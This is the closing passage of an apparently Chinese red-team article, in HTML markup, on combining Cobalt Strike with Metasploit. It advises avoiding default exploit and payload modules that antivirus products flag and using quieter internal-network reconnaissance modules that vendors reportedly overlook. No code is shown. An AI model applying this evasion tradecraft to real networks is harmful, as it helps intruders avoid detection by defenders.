class="cs9C1B1871">和</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">模块</span><span class="cs8926E06">,</span><span class="cs9C1B1871">对现如今的实战场景确实没啥卵用</span><span class="cs8926E06">[</span><span class="cs9C1B1871">如果你就不做任何处理直接默认用的话</span><span class="cs8926E06">],</span><span class="cs9C1B1871">也不用想了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为各类传统监控和杀软早都已围追堵截</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不过</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我想说的是</span><span class="cs8926E06">,</span><span class="cs9C1B1871">你大可以不必用这些大家天天都死死盯着的东西</span><span class="cs8926E06">,</span><span class="cs9C1B1871">比如</span><span class="cs8926E06">,</span><span class="cs9C1B1871">某些内网探测模块一直都很好用呀</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而且控制的好</span><span class="cs8926E06">,</span><span class="cs9C1B1871">动静儿也并不会非常大</span><span class="cs8926E06">,</span><span class="cs9C1B1871">重要的是</span><span class="cs8926E06">,</span><span class="cs9C1B1871">各个厂商也几乎都不怎么关注这些无关痛痒的辅助模块</span><span class="cs8926E06">,</span><span class="cs9C1B1871">关注更多的还是那堆致命的</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">和</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">的模块</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以</span><span class="cs8926E06">,</span><span class="cs9C1B1871">自己也经常强调</span><span class="cs8926E06">,</span><span class="cs9C1B1871">工具是死的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">人是活的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">关于</span><span class="cs8926E06"> Cs </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">联动配合利用方式还远不止这些</span><span class="cs8926E06">,</span><span class="cs9C1B1871">来日方长</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们后续再慢慢说</span><span class="cs8926E06">,</span><span class="cs9C1B1871">考虑到文章篇幅</span><span class="cs8926E06">,</span><span class="cs9C1B1871">有些地方说的并不是非常细致</span><span class="cs8926E06">,</span><span class="cs9C1B1871">弟兄们有任何问题</span><span class="cs8926E06">,</span><span class="cs9C1B1871">随时反馈就好</span><span class="cs8926E06">,</span><span class="cs9C1B1871">最后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">祝好运</span></p></body>
</html>
